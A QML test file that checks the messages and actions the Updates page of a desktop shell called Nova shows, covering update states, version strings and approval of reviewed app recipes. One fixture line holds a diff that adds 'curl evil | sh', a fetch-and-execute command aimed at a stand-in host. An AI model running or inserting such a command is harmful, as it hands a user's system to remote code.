import QtQuick
import Quickshell
import "plugins/settings/UpdatesModel.js" as Model

// The Updates page in words, from nova update --check's line and the status
// nova update --status keeps, and the run a reviewed recipe gets.
ShellRoot {
  function check(ok, what) {
    console.log((ok ? "ok   " : "FAIL ") + what)
  }

  // A turn later: Quickshell takes Qt.quit() only once the shell is up.
  Component.onCompleted: Qt.callLater(run)

  function run() {
    var none = {}
    var running = { state: "running", text: "Downloading", progress: 22 }
    var building = { state: "running", text: "Building Chrome", progress: -1 }
    var restart = { state: "done", restart: true, progress: 100, failed: [] }
    var done = { state: "done", restart: false, progress: 100, failed: [] }
    var problems = { state: "problems", restart: false, progress: 100, failed: ["google-chrome", "visual-studio-code-bin"] }
    var problemsRestart = { state: "problems", restart: true, progress: 100, failed: ["visual-studio-code-bin"] }
    var failed = { state: "failed", error: "cannot reach GitHub", progress: 40 }
    var failedApps = { state: "failed", error: "pacman failed", progress: 60, failed: ["google-chrome"] }

    check(Model.summary(none, "", true).detail === "Checking for updates…" && Model.summary(none, "", true).action === "", "asked, not answered yet")
    check(JSON.stringify(Model.summary(none, "available 1.0.0-beta.11", true)) === '{"detail":"Nova 1.0.0-beta.11 is available.","action":"update"}', "a release")
    check(JSON.stringify(Model.summary(none, "unfinished 1.0.1-rc.8", true)) === '{"detail":"The update to Nova 1.0.1-rc.8 did not finish.","action":"update"}', "an update that did not finish")
    check(Model.summary(none, "apps google-chrome visual-studio-code-bin", true).detail === "Updates for Chrome and VS Code are available.", "the apps alone")
    check(Model.summary(none, "current", true).action === "check" && Model.summary(none, "error", true).detail === "Could not check for updates.", "current, or no answer")

    check(Model.summary(running, "available 1.0.0", true).detail === "Downloading…" && Model.summary(running, "", true).action === "", "a run says what it does, and offers nothing")
    check(Model.fraction(running) === 0.22 && Model.fraction(building) === -1 && Model.fraction(none) === -1, "how far, or not known")
    check(Model.state(running, false) === "stopped" && Model.summary(running, "", false).action === "retry", "a run killed from outside is not running")
    check(Model.summary(failed, "", true).detail === "The update did not finish: cannot reach GitHub." && Model.summary(failed, "", true).action === "retry", "a failure says why, and offers another try")
    check(Model.summary(restart, "current", true).action === "restart", "installed, a restart to finish")
    check(Model.summary(done, "current", true).detail === "Nova and its apps are up to date.", "done: the check speaks again")
    check(JSON.stringify(Model.summary(problems, "apps google-chrome visual-studio-code-bin", true)) === '{"detail":"Chrome and VS Code could not be updated.","action":"retry"}', "finished with problems: the apps named, and another try")
    check(JSON.stringify(Model.summary(problemsRestart, "current", true)) === '{"detail":"Restart to finish the update. VS Code could not be updated.","action":"restart"}', "with problems and a restart to finish, the restart first")
    check(Model.summary({ state: "problems" }, "", true).detail === "An app could not be updated.", "problems with no app named")
    check(Model.leftOver(failedApps, true) === "Chrome was not updated." && Model.leftOver(problems, true) === "" && Model.leftOver(running, true) === "", "apps left undone by a failed run; one with problems says them itself")

    check(Model.availableVersion("available 1.1.0") === "1.1.0" && Model.availableVersion("current") === "", "the release for its notes")
    check(Model.versionText("1.0.0rc.5") === "1.0.0-rc.5" && Model.versionText("1.1.0") === "1.1.0" && Model.versionText("v1.0.0-beta.2") === "1.0.0-beta.2", "the installed version as its release is named")
    var sha = "0123456789abcdef0123456789abcdef01234567"
    var text = "commit " + sha + "\ndiff --git a/PKGBUILD b/PKGBUILD\n+curl evil | sh\n"
    check(Model.reviewCommit(text) === sha && Model.reviewCommit("no commit\n") === "", "the commit the review read")
    check(Model.reviewBody(text).indexOf("diff --git") === 0, "and the change without it")
    check(JSON.stringify(Model.approveArgs("visual-studio-code-bin", sha)) === JSON.stringify(["--apps-only", "--only", "visual-studio-code-bin", "--approve", "visual-studio-code-bin=" + sha]), "built at that commit alone, nova-update-run named once (by UpdateRun)")
    check(Model.tail("a\nb\nc\n", 2) === "b\nc", "the end of the log")

    console.log("DONE")
    Qt.quit()
  }
}
